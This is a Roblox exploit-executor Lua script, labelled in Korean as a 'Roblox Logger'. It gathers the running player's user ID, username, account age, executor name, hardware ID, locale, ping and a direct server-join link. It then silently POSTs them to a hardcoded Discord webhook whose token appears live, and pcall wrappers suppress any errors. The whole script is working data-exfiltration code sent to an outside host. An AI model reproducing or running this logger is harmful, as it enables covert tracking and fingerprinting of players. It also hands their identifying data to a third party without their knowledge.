local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local LocalizationService = game:GetService("LocalizationService")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local MarketplaceService = game:GetService("MarketplaceService")

local plr = LocalPlayer
local placeId = game.PlaceId
local jobId = game.JobId

local WebhookUrl = getgenv().WebhookUrl or "https://discord.com/api/webhooks/1396127363707699341/EwEfN81d2322RWK17YKnekwUbJZ4lfAJ3QVupznPdpyewmCufyzMKbX5txmaJbDuhmld"

local function formatTime(seconds)
    local h = seconds // 3600
    seconds = seconds - h * 3600
    local m = seconds // 60
    local s = seconds - m * 60
    return string.format("%02d:%02d:%02d", h, m, s)
end

local userId = plr and plr.UserId or 0
local displayName = plr and plr.DisplayName or "Unknown"
local username = plr and plr.Name or "Unknown"
local accountAge = plr and plr.AccountAge or 0

local executorName = "알 수 없음"
if identifyexecutor then
    pcall(function() executorName = identifyexecutor() end)
end
local hwid = "알 수 없음"
if get_hwid then
    pcall(function() hwid = get_hwid() end)
end

local ping = 0
if plr and plr.GetNetworkPing then
    ping = math.floor(plr:GetNetworkPing() * 2000)
end
local playerCount = #Players:GetPlayers()
local reconnectLink = "roblox://placeId=" .. placeId .. "&gameInstanceId=" .. jobId

local descriptionLines = {
    "**👤 플레이어 정보**",
    "> 🆔 **유저 Id:** " .. userId,
    "> 🎫 **표시 이름:** " .. displayName,
    "> 🎟️ **사용자명:** " .. username,
    "> 📅 **계정 생성일:** " .. accountAge .. "일 전",
    "",
    "**🖥️ 장치 정보**",
    "> 🕒 **시간:** " .. os.date("%X"),
    "> 📆 **날짜:** " .. os.date("%Y-%m-%d"),
    "> 💾 **메모리 사용량:** " .. (collectgarbage and (collectgarbage("count") // 1) or "N/A") .. "KB",
    "> 🌍 **사용 언어:** " .. (LocalizationService and LocalizationService.RobloxLocaleId or "Unknown"),
    "",
    "**☑️ 실행기 정보**",
    "> 📼 **이름:** " .. executorName,
    "> 🔑 **HWID:** " .. hwid,
    "",
    "**🎮 게임 정보**",
    "> 📌 **이름:** " .. ((MarketplaceService and pcall(function() return MarketplaceService:GetProductInfo(placeId).Name end) and MarketplaceService:GetProductInfo(placeId).Name) or "Unknown"),
    "> 📜 **Place Id:** " .. placeId,
    "",
    "**🌐 서버 정보**",
    "> 📶 **핑:** " .. ping .. "ms",
    "> 👥 **플레이어 수:** " .. playerCount,
    "> 🔗 **접속 링크:** ```" .. reconnectLink .. "```"
}

local descriptionText = table.concat(descriptionLines, "\n")

local payload = HttpService:JSONEncode({
    content = "```👁️‍🗨️|NPDL] : New Player Data Logged!```",
    embeds = {{
        title = "Roblox Logger",
        description = descriptionText,
        color = tonumber("0x3498db"),
        author = {
            name = string.format("%s (%s)", displayName or "Unknown", username or "Unknown")
        },
        footer = {
            text = "Logger • " .. os.date("%Y-%m-%d %H:%M:%S")
        }
    }}
})

local request = http_request or request or HttpPost or syn and syn.request or nil
if request then
    pcall(function()
        request({
            Url = WebhookUrl,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = payload
        })
    end)
end
